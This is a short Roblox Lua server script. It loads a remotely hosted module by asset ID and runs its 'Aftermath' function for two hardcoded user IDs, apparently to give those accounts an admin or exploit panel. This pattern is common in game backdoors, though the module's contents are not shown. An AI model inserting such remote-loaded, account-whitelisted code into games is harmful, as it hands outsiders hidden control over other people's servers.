-- Services --
local players = game:GetService("Players");

-- Modules --
local AM = require(4293810048);

-- Constants --
local users = { 332777848, 5303687 };

-- Variables and Functions --
local function CheckForAftermath(player)
    for _, gui in pairs(player:GetChildren()) do
        if (gui:IsA("ScreenGui") and (((tonumber(gui.Name)) and (string.len(gui.Name) == 15)) or (gui.Name == "Aftermath"))) then
            return gui;
        end
    end
end

local function onPlayerAdded(player)
    if (table.find(users, player.UserId)) then
        task.wait(1); -- wait for normal aftermath to load if it exists
        if (not CheckForAftermath(player)) then
            AM.Aftermath(player.Name);
        else
            print("User already has Aftermath! >:P")
        end
    end
end

-- Events --
players.PlayerAdded:Connect(onPlayerAdded)
for _, player in pairs(players:GetPlayers()) do
    coroutine.wrap(onPlayerAdded)(player)
end
